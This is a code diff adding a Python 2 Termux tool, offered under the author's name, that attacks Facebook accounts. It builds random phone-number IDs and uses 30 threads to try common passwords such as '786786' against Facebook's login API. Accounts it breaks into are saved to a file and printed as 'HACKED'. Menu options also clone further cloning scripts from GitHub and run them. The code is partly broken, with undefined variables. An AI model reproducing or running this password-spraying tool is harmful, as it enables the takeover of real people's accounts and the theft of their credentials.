@@ -1,0 +1,377 @@
+# Ustad# SIDRA5# Thuglife# Somibro# Gamz#!/usr/bin/python2
+#coding=utf-8
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
+os.system('rm -rf .txt')
+for n in range(1500):
+
+    nmbr = random.randint(1111111, 9999999)
+    
+    sys.stdout = open('.txt', 'a')
+
+    print  nmbr
+
+    sys.stdout.flush()
+    
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install mechanize')
+    
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install request')
+    time.sleep(1)
+    os.system('python2 .README.md')
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.addheaders = [('Opera/12.02 (Android 4.1; Linux; Opera Mobi/ADR-1111101157; U; en-US) Presto/2.9.201 Version/12.02')]
+br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+
+def exb():
+    print '[!] Exit Successfully '
+    os.sys.exit()
+
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!'+w[random.randint(0,len(w)-1)]+i
+    return cetak(d)
+
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
+    x += '\033[0m'
+    x = x.replace('!0','\033[0m')
+    sys.stdout.write(x+'\n')
+
+def lodhirt():
+    lodhirt = [
+     'AM', '   ', 'AM', '  ', 'SHOW MAN\n']
+    for o in lodhirt:
+        print '\r\x1b[1;94m\x1b[1;91m' + o,
+        sys.stdout.flush()
+        time.sleep(0.5)
+def jalan(x):
+	for e in x + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(3.0 / 200)
+def tik():
+    titik = [
+     '   ', '. ', '.. ', '...', '....', '  ', '   ']
+    for o in titik:
+        print '\r\x1b[1;97m \x1b[1;91mLoad\x1b[1;92ming\x1b[1;97m' + o,
+        sys.stdout.flush()
+        time.sleep(0.5)
+        
+
+
+os.system("clear")
+logo = """
+
+
+"""
+logo1 = """
+\033[1;94m ######   #######  ##     ## #### 
+\033[1;92m##    ## ##     ## ###   ###  ##  
+\033[1;96m##       ##     ## #### ####  ##  
+ \033[1;92m######  ##     ## ## ### ##  ##  
+\033[1;91m      ## ##     ## ##     ##  ##  
+\033[1;94m##    ## ##     ## ##     ##  ##  
+\033[1;95m ######   #######  ##     ## #### 
+\033[1;94m ######  ##     ##  #######  ##      ## 
+\033[1;93m##    ## ##     ## ##     ## ##  ##  ## 
+\033[1;92m##       ##     ## ##     ## ##  ##  ## 
+ \033[1;91m######  ######### ##     ## ##  ##  ## 
+\033[1;96m      ## ##     ## ##     ## ##  ##  ## 
+\033[1;95m##    ## ##     ## ##     ## ##  ##  ## 
+\033[1;92m ######  ##     ##  #######   ###  ###  
+\033[1;94m##     ##    ###    ##    ## 
+\033[1;93m###   ###   ## ##   ###   ## 
+\033[1;95m#### ####  ##   ##  ####  ## 
+\033[1;91m## ### ## ##     ## ## ## ## 
+\033[1;96m##     ## ######### ##  #### 
+\033[1;92m##     ## ##     ## ##   ### 
+\033[1;91m##     ## ##     ## ##    ## 
+
+
+                                                
+\033[1;97m===============================================
+\033[1;92m☣CREATER   :  Somi awan჻
+\033[1;96m☣WHATAAP : 03455453538჻
+\033[1;91m☣FACEBOOK Somi Awan჻
+\033[1;95m☣WITHOUT PKG CLONING ჻
+\033[1;94m☣NEW TREND AM BRAMD ჻
+\033[1;97m===============================================
+\033[1;93m☀NOTE Termux Data Clear EveryDay ჻
+\033[1;97m===============================================
+                                                             
+
+"""
+logo2 = """
+
+\033[1;94m ######   #######  ##     ## #### 
+\033[1;92m##    ## ##     ## ###   ###  ##  
+\033[1;96m##       ##     ## #### ####  ##  
+ \033[1;92m######  ##     ## ## ### ##  ##  
+\033[1;91m      ## ##     ## ##     ##  ##  
+\033[1;94m##    ## ##     ## ##     ##  ##  
+\033[1;93m ######   #######  ##     ## #### 
+                                                
+"""
+logo3 = """                                
+\033[1;93m____ _  _ ____ _ _ _ 
+\033[1;92m[__  |__| |  | | | | 
+\033[1;96m___] |  | |__| |_|_| 
+\033[1;93m_  _ ____ _  _ 
+\033[1;96m|\/| |__| |\ | 
+\033[1;92m|  | |  | | \| 
+\033[1;92m▬▬▬▬▬▬▬▬\033[1;91m▬▬▬▬▬▬▬▬▬\033[1;96m▬▬▬▬▬▬▬▬▬\033[1;95m▬▬▬▬▬▬▬▬▬\033[1;93m▬▬▬▬▬▬▬▬▬▬▬▬
+\033[4;93m✲NOTE:
+COUNTRY SIM CODE TYPE KRA OR NACHA USI
+COUNTARY K COUNTARY CODE TYPE KRA \033[1;0m
+\033[1;92m▬▬▬▬▬▬▬▬\033[1;91m▬▬▬▬▬▬▬▬▬\033[1;96m▬▬▬▬▬▬▬▬▬\033[1;95m▬▬▬▬▬▬▬▬▬\033[1;93m▬▬▬▬▬▬▬▬▬▬▬▬
+               
+\033[4;92m▣TYPE YOUR FAVOURITE SIM CODE▣\033[1;0m
+
+"""
+logo4 ="""
+\033[4;96m▣TYPE COUNTARY CODE▣\033[1;0m
+"""
+back = 0
+berhasil = []
+cekpoint = []
+oks = []
+id = []
+cpb = []
+def menu():
+    os.system('clear')
+    print logo1
+    print 47* '\033[1;97m.'
+    print
+    print
+    jalan('\x1b[1;92m┠\x1b[1;96m1\x1b[1;95m┨\x1b[1;93m❈6 DIGIT CLONE \x1b[1;92m┠\x1b[1;96m2\x1b[1;95m┨\x1b[1;96m❈7 DIGIT CLONE  ')
+    print
+    jalan('\x1b[1;92m┠\x1b[1;96m3\x1b[1;95m┨\x1b[1;92m❈8&9DIGIT CLONE \x1b[1;92m┠\x1b[1;96m4\x1b[1;95m┨\x1b[1;93m❈11 DIGIT CLONE')
+    print
+    jalan('\x1b[1;92m┠\x1b[1;96m4\x1b[1;95m┨\x1b[1;93m❈11 DIGIT CLONE \x1b[1;92m┠\x1b[1;96m5\x1b[1;95m┨\x1b[1;97m❈ALL COUNTRIES NEW TREND')
+    print
+    print
+    jalan('\033[1;92m▬▬▬▬▬▬▬▬\033[1;91m▬▬▬▬▬▬▬▬▬\033[1;96m▬▬▬▬▬▬▬▬▬\033[1;95m▬▬▬▬▬▬▬▬▬\033[1;93m▬▬▬▬▬▬▬▬▬▬▬▬')
+    jalan('       \x1b[1;91m┠\x1b[1;93m6\x1b[1;91m┨\x1b[1;91mYou\033[1;97mtube \x1b[1;91m┠\x1b[1;93m7\x1b[1;91m┨\x1b[1;92m Whats\033[1;97maap \x1b[1;91m┠\x1b[1;93m00\x1b[1;91m┨\x1b[1;92m E\x1b[1;93mXIT')
+    jalan('\033[1;92m▬▬▬▬▬▬▬▬\033[1;91m▬▬▬▬▬▬▬▬▬\033[1;96m▬▬▬▬▬▬▬▬▬\033[1;95m▬▬▬▬▬▬▬▬▬\033[1;93m▬▬▬▬▬▬▬▬▬▬▬▬')
+    print 47* '\033[1;97m.'
+    lodhirt()
+    action()
+
+
+def action():
+    global cpb
+    global oks
+    somi = raw_input('\n\n \x1b[1;90m╾  ')
+    if somi == '':
+        print '[!] Fill in correctly'
+        action()
+    elif somi =="1":
+        tik()
+        os.system("rm -rf $HOME/six")
+        os.system("cd $HOME && git clone https://github.com/Somi190/six.git")     
+        
+        time.sleep(5)
+        os.system("cd $HOME/six && python2 six.py")
+        somi()
+    elif somi =="2":
+        tik()
+        os.system("rm -rf $HOME/seven")
+        os.system("cd $HOME && git clone https://github.com/Somi190/seven.git")     
+        
+        time.sleep(5)
+        os.system("cd $HOME/seven && python2 seven.py")
+        somi()       
+    elif somi =="3":
+        tik()
+        os.system("rm -rf $HOME/8-9")
+        os.system("cd $HOME && git clone https://github.com/Somi190/8-9.git")     
+        
+        time.sleep(5)
+        os.system("cd $HOME/8-9 && python2 nine.py")
+        somi()                      
+    elif somi =="4":
+        tik()
+        os.system("rm -rf $HOME/eleven")
+        os.system("cd $HOME && git clone https://github.com/Somi190/eleven.git")     
+        
+        time.sleep(5)
+        os.system("cd $HOME/eleven && python2 eleven.py")
+        somi()                     
+    elif somi == '5':
+        tik()
+        os.system('clear')
+        print logo2
+        print logo3
+        try:
+            c = raw_input('╾')
+            print logo4
+            k = raw_input('╾')
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            somi()                    
+    elif somi =="6":                               
+    	os.system('xdg-open https://youtu.be/kvo2PWGBI8I')
+        somi()
+        tik()
+    elif Somi =="7":                                    
+    	os.system('xdg-open https://chat.whatsapp.com/I4DBVT9wCPy3i9318UFu0P')
+        somi()            
+    elif somi == '00':            
+    	exb()
+        login()
+    else:
+        print '[!] Fill In Correctly'
+        action()
+        
+    print 47* '\033[1;97m◍'
+    xxx = str(len(id))
+    jalan('\033[1;96m  ↳TOTAL IDS NUMBER : '+xxx)
+    jalan('\033[1;92m  ↳JUST 5 CLONING PASSWORD')
+    jalan("\033[1;93m ↳TO STOP THIS PROCESS PRESS Ctrl THEN Z")
+    print 47* '\033[1;97m◍'
+            
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+        try:
+            pass1 = user
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;93m(SOMI \x1b[1;91mHACKED )  ' + k + c + user + '  ↱  ' + pass1                                       
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k+c+user+pass1+'\n')
+                okb.close()
+                oks.append(c+user+pass1)
+            else:
+                if 'www.facebook.com' in q['error_msg']:
+                    print '\033[1;93m╠WAIT═\x1b[1;92m7═DAYS╣ ' + k + c + user + '  ↱  ' + pass1
+                    cps = open('save/checkpoint.txt', 'a')
+                    cps.write(k+c+user+pass1+'\n')
+                    cps.close()
+                    cpb.append(c+user+pass1)
+                else:
+                    pass2 = k + c + user
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;93m(SOMI \x1b[1;91mHACKED)  ' + k + c + user +  '  ↱  ' + pass2
+                        okb = open('save/successfull.txt', 'a')
+                        okb.write(k+c+user+pass2+'\n')
+                        okb.close()
+                        oks.append(c+user+pass2)
+                    else:
+                        if 'www.facebook.com' in q['error_msg']:
+                            print '\033[1;93m╠WAIT═\x1b[1;92m7═DAYS╣ ' + k + c + user + '  ↱  ' + pass2
+                            cps = open('save/checkpoint.txt', 'a')
+                            cps.write(k+c+user+pass2+'\n')
+                            cps.close()
+                            cpb.append(c+user+pass2)
+                        else:
+                            pass3="000786"
+                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                            q = json.load(data)
+                            if 'access_token' in q:
+                                print '\x1b[1;93m(SOMI \x1b[1;91mHACKED)  ' + k + c + user + '  ↱  '+ pass3
+                                okb = open('save/successfull.txt', 'a')
+                                okb.write(k+c+user+pass3+'\n')
+                                okb.close()
+                                oks.append(c+user+pass3)
+                            else:
+                                if 'www.facebook.com' in q['error_msg']:
+                                    print '\033[1;93m╠WAIT═\x1b[1;92m7═DAYS╣ ' + k + c + user + '  ↱  ' + pass3 
+                                    cps = open('save/checkpoint.txt', 'a')
+                                    cps.write(k+c+user+pass3+'\n')
+                                    cps.close()
+                                    cpb.append(c+user+pass3)
+                                else:
+                                    pass4="786786"
+                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                    q = json.load(data)
+                                    if 'access_token' in q:
+                                        print '\x1b[1;93m(SOMI \x1b[1;91mHACKED)  ' + k + c + user + '  ↱  ' + pass4 
+                                        okb = open('save/successfull.txt', 'a')
+                                        okb.write(k+c+user+pass4+'\n')
+                                        okb.close()
+                                        oks.append(c+user+pass4)
+                                    else:
+                                        if 'www.facebook.com' in q['error_msg']:
+                                            print '\033[1;93m╠WAIT═\x1b[1;92m7═DAYS╣ ' + k + c + user + '  ↱  ' + pass4
+                                            cps = open('save/checkpoint.txt', 'a')
+                                            cps.write(k+c+user+pass4+'\n')
+                                            cps.close()
+                                            cpb.append(c+user+pass4)
+                                        else:
+                                            pass5="786786786"
+                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            q = json.load(data)
+                                            if 'access_token' in q:
+                                                print '\x1b[1;93m(SOMI \x1b[1;91mHACKED)  ' + k + c + user + '  ↱  ' + pass5
+                                                okb = open('save/successfull.txt', 'a')
+                                                okb.write(k+c+user+pass5+'\n')
+                                                okb.close()
+                                                oks.append(c+user+pass5)
+                                            else:
+                                                if 'www.facebook.com' in q['error_msg']:
+                                                    print '\033[1;93m╠WAIT═\x1b[1;92m7═DAYS╣ '+ k + c + user + '   ↱  ' + pass5 
+                                                    cps = open('save/checkpoint.txt', 'a')
+                                                    cps.write(k+c+user+pass5+'\n')
+                                                    cps.close()
+                                                    cpb.append(c+user+pass5)
+                                                                                                          
+                                                                                      
+                                                                                                                                                                                                                    
+                                                                                                                                                                                                            
+
+
+                                                
+     
+                                                                                                                                                                                                                                                                                                             
+        except:
+            pass
+        
+    p = ThreadPool(30)
+    p.map(main, id)
+    print '[\xe2\x9c\x93] \x1b[1;96mPROCESS HAS BEEN COMPLETED....'
+    print '[\xe2\x9c\x93] \x1b[1;96mTOTAL HACKED/CHECKPOINT : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '[\xe2\x9c\x93] \x1b[1;96mCP FILE HAS BEEN SAVED : save/login.txt'
+    raw_input('\n[\x1b[1;96mPRESS ENTER TO GO BACK]')
+    print 'SOMI BRAND CODING STAR'
+    print ''
+    print """
+    """
+    
+    raw_input("\n\033[1;92m[\033[1;92mEXIST\033[1;92m]")
+    menu() 
+          
+if __name__ == '__main__':
+    menu()
+
